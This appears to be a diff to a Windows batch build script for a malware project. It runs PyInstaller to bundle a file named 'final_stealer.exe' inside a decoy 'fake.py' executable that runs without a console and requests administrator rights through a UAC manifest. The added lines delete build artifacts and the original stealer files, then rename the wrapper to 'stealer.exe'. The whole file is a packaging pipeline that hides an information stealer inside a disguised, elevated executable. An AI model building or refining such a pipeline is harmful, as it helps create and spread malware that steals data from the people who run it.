@@ -37,3 +37,14 @@ wsl bash wsl.sh
 
 ren final_stealer.exe stealer.exe
 pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest --add-data "stealer.exe;." .\fake.py
+DEL fake.spec
+cd /d "%scriptDir%dist"
+move fake.exe ..
+cd ..
+
+powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
+powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"
+DEL final_stealer.exe
+DEL stealer.exe
+
+ren fake.exe stealer.exe
